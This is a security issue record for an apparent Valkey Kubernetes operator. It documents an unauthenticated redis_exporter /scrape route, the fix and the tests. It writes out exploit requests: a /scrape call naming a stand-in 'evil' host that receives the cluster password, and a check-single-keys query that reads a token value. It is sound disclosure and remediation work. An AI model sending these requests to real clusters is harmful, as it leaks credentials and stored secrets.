---
id: T65
title: the exporter port serves more than /metrics, without authentication
state: done
severity: high        # one unauthenticated request sent the cluster password (default user, +@all) to a caller-named host; a second read key values
security: boundary    # needed a hostile principal with network reach to the exporter port; confirmed by the owner 2026-09-29
threat: "a principal with pod-network reach to TCP spec.metrics.port (default 9121) of a data pod - the operator's own NetworkPolicy admitted every source on that port, and without the policy the flat pod network admits every pod - sends one unauthenticated HTTP GET /scrape?target=<a host it controls> and makes the exporter authenticate with the cluster password to that host, or GET /scrape?target=<the pod's Valkey>&check-single-keys=db0=<key> and reads string key values back; on every cluster with spec.auth and spec.metrics.enabled"
urgency: now          # rule 1: two tracked statements were measured false (networkpolicy.go comment, ADR 0018 D1); both corrected
effort: L             # the exporter bump, the single-pod deferral rule, the generated NetworkPolicies of ADR 0039
blocked-by:
filed-from: T50, verify_050.json (M9, M10 and the /scrape half of M11)
opened: 2026-09-27
decided: 2026-09-29
done: 2026-09-29
shipped: "a109795, merged as 9f5cfba (PR #237): exporter v1.92.1 with /scrape and key-value export switched off on every cluster, the single-pod exporter rule (ExporterOutdated), the generated NetworkPolicies of ADR 0039; release pending on the main run of the merge"
---

# T65 - the exporter port serves more than /metrics, without authentication

## Current state

Fixed and merged on 2026-09-29 (`a109795`, merge `9f5cfba`, PR #237). The embargo is lifted: the
owner decided on 2026-09-29 that the commit and the PR describe the mechanism openly.

**The finding.** The `redis_exporter` sidecar listens on `spec.metrics.port` without
authentication. v1.66.0, the pin until this fix, served `/scrape?target=…`, which dialled a
caller-named target with a copy of the exporter's options — the configured password included,
credentials in the target URL discarded — and exported a string key's value as the `val` label of
`redis_key_value_as_string` for `check-single-keys` taken from the query string. The generated
NetworkPolicy admitted every source on that port; without a policy the flat pod network admits
every pod. Measured in docker against the pinned digest (arm64), on `valkey/valkey` 9.1.1 and
8.1.9:

- **M9:** `GET /scrape?target=redis://evil:evil@<listener>:6379` returned 200 and the listener
  received exactly `*2\r\n$4\r\nAUTH\r\n$6\r\ns3cret\r\n` — the configured password, not the URL's.
- **M9-TLS** (9.1.1): with the operator's TLS wiring, a `redis://` target received the same 26
  bytes in cleartext.
- **M10:** `check-single-keys=db0=customer:42:token` returned the value; `check-keys` listed every
  matching key with its size.

**What shipped.** Recorded in [ADR 0018](../../adr/0018-metrics-and-the-exporter-sidecar.md) D11
(D1 corrected in place), [ADR 0039](../../adr/0039-a-networkpolicy-admits-only-the-components-this-repository-deploys.md)
and the [ADR 0007](../../adr/0007-failover-aware-rolling-update.md) amendment of 2026-09-29; the
operator-facing side in [monitoring.md](../../operations/monitoring.md),
[network-policy.md](../../operations/network-policy.md),
[upgrading.md](../../operations/upgrading.md), [status.md](../../operations/status.md) and
[secrets-and-tls.md](../../security/secrets-and-tls.md).

- `DefaultMetricsExporterImage` is v1.92.1, pinned by its index digest; the builder sets
  `REDIS_EXPORTER_DISABLE_SCRAPE_ENDPOINT=true` and
  `REDIS_EXPORTER_DISABLE_EXPORTING_KEY_VALUES=true` on every cluster, as variables, not flags.
- A single data pod without Sentinel whose exporter image or env differs from the template is
  decided by persistence: replaced when persistent, held and reported as
  `PodSecurityUpdatePending=True/ExporterOutdated` when not (decided by the owner 2026-09-29).
- The generated NetworkPolicies open no rule for the exporter, sidecar health and observer
  ports, admit the operator as its pod (`--operator-pod-selector`, `POD_NAMESPACE`), and are
  deleted when the spec no longer asks for them.

**Verified.**

- `TestExporter_ServesNoScrapeRoute` (`make test-image-tools`) on both pinned Valkey lines,
  locally on arm64 and in the PR's CI on amd64: `redis_up 1`, no connection to a foreign
  `/scrape` target, no key value on `/scrape` or `/metrics`; its negative control receives the 26
  `AUTH` bytes of M9 without the two variables. Mutations 2/2 there, 6/6 in the unit tier.
- The PR's CI green, the three e2e legs and the multi-node leg included; the e2e tests that
  enable metrics ran the v1.92.1 exporter on a node.
- By hand: v1.92.1 over TLS reports `redis_up 1`; v1.66.0 with the two variables starts and
  keeps `/scrape` (the residual below).

## What stays open, recorded elsewhere

- An exporter image set through `spec.metrics.image` older than v1.83.0 keeps `/scrape`;
  `spec.metrics.extraArgs` can switch the route back on. Both are CR-author choices (ADR 0018
  Residual risks, README `spec.metrics.image` row).
- The pod of a non-persistent single-replica cluster keeps the old exporter until it restarts,
  reported as `ExporterOutdated`.
- The exporter still authenticates as the default user — T50.
- The Renovate manager for the exporter pin — T45 change 13.
- NetworkPolicy enforcement on a node: no test proves the tightened policies block, and whether
  every CNI in the fleet admits node traffic to a port without a rule is not verified (ADR 0039
  Residual risks).
